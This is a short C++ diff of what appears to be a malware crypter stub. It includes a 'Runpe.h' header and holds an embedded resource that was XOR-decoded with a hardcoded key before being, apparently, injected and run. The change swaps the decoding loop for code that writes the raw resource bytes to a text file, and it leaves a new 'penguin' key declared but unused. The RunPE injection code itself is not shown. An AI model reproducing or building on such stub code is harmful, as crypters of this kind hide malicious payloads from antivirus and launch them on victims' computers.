@@ -1,6 +1,10 @@
 #include <iostream>
 #include <Windows.h>
+#include <fstream>
+#include <string>
 #include "Runpe.h"
+
+using namespace std;
 
 int Rsize;
 char* RData;
@@ -15,9 +19,14 @@ void Resource(int id)
 
 void enc()
 {
-char cipher[] = "cipher";
-for (int i = 0; i < Rsize; i++)
-    RData[i] ^= cipher[i % strlen(cipher)];
+	ofstream out("In Stub.txt");
+	char cipher[] = "penguin";
+
+	for (int i = 0; i < Rsize; i++)
+	{
+		out << RData[i];
+	}
+	out.close();
 }
 
 int WINAPI WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine,int nCmdShow)
